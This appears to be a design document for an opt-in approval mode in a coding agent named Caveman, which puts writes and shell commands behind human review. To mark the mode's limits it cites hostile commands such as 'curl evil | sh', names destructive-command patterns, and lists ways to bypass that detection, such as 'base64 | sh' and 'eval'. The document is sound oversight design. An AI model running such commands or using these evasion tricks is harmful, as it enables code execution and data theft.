# Approval mode (OPT-IN) — #14

Approval mode forces a human to review **writes, shell commands, and unknown
tools** before they run. Reads run free. It exists so a team can adopt Caveman
on a real repo without giving the agent unsupervised write/exec access.

## What it is NOT

**Approval mode is a human-review speed-bump, NOT a security perimeter.** Be
honest with yourself about what it does and does not give you:

- It forces a pause for human review before a write/bash. That prevents
  *accidents* (a wrong path, an unintended `rm`, a stray migration).
- It does **not** contain a malicious or already-approved action. An approved
  command can still `curl evil | sh`, exfiltrate data, or escape the workspace.
- The "destructive" tag on bash (rm -rf, force-push, `git reset --hard`,
  DROP/TRUNCATE) is a **best-effort heuristic for surfacing risk to the human**.
  It is trivially defeated (`eval`, `$()`, `base64 | sh`, `python -c`, aliases).
  Obfuscated commands fall back to the plain `exec` tier — they still require
  approval, so the safe outcome holds, but do not treat the heuristic as a
  boundary.

For **real isolation** (filesystem confined to the workspace, network denied,
enforced at the OS/process level — not prompted) see the enforced sandbox,
tracked separately in **#46**.

## Default is unchanged

Autopilot remains the default and is byte-for-byte unchanged. When approval mode
is OFF, no gate, classifier, or approval callback runs — there is no added path
or overhead on the autopilot flow. Approval mode is purely additive and opt-in.

## How to enable it

Three equivalent ways:

```bash
# 1. CLI flag (this run only)
caveman --approval

# 2. Environment variable (this process + any subagents it spawns)
CAVE_APPROVAL_MODE=1 caveman

# 3. In a running session, toggle with the slash command
/approval on
/approval off
/approval status
```

You can also persist it in settings (`approvalMode: true` in `settings.json`).
An explicit setting wins over the env var.

Approval mode is **orthogonal** to the chat modes (plan / edit / auto) — it
composes with them. It is not a fourth chat mode.

## What you'll see

When the agent wants to run a non-read tool, a dialog appears:

```
  edit wants to make changes
  src/server.ts

  ▸ Approve once
    Approve for session
    Deny

  Human review, NOT a security perimeter — an approved action can still do damage (#46 = sandbox).
```

- **Approve once** — allow this single call; you'll be asked again next time.
- **Approve for session** — allow this call and stop prompting for that tool for
  the rest of the session.
- **Deny** — block the call; the agent gets an error result and continues.

## Headless and subagents (deny-by-default)

In any context without an interactive prompt — print/headless mode, or a
subagent spawned via the Task tool — approval mode **denies by default**. It
never silently allows.

`CAVE_APPROVAL_MODE` is forwarded unconditionally into spawned subagents, so a
guarded parent cannot be bypassed by delegating writes to a subagent. Because a
subagent has no interactive channel, its write/exec tools are denied. This is the
safe interim behavior until subagent write access (#41) provides a real delegated
-approval channel.

## Implementation notes

- Pure classifier: `packages/coding-agent/src/core/approval-policy.ts`
  (`classifyToolCall`, `needsApproval`). Exhaustively unit-tested.
- Gate: `AgentSession`'s `beforeToolCall` hook consults the classifier only when
  approval mode is on, and forces `toolExecution: "sequential"` so concurrent
  tool calls can't race the single prompt.
- Setting: `SettingsManager.getApprovalMode` / `setApprovalMode`
  (+ `CAVE_APPROVAL_MODE` env fallback).
- UI: `packages/coding-agent/src/modes/interactive/components/approval-prompt.ts`.
